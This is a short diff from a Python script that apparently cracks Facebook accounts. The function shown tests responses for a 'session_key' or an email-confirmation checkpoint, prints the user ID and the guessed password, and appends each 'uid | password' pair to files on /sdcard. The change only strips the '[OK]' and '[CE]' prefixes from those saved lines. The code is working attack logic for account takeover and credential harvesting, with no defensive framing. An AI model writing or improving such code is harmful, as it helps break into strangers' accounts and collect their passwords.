@@ -296,14 +296,14 @@ def file_subb(uid, gxdspw):
             if "session_key" in q:
                 print(f"\r\r\033[0;36m  [OK] {uid} || {ps}")
                 open("/sdcard/gxds-ok.txt", "a+").write(
-                    "[OK]" + uid + " | " + ps + "\n"
+                    uid + " | " + ps + "\n"
                 )
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in q:
                 print(f"\r\r\033[94m  [CE] {uid} | {ps}\n")
                 open("/sdcard/gxds-ce.txt", "a+").write(
-                    "[CE]" + uid + " | " + ps + "\n"
+                    uid + " | " + ps + "\n"
                 )
                 oks.append(uid)
             elif "www.facebook.com" in q:
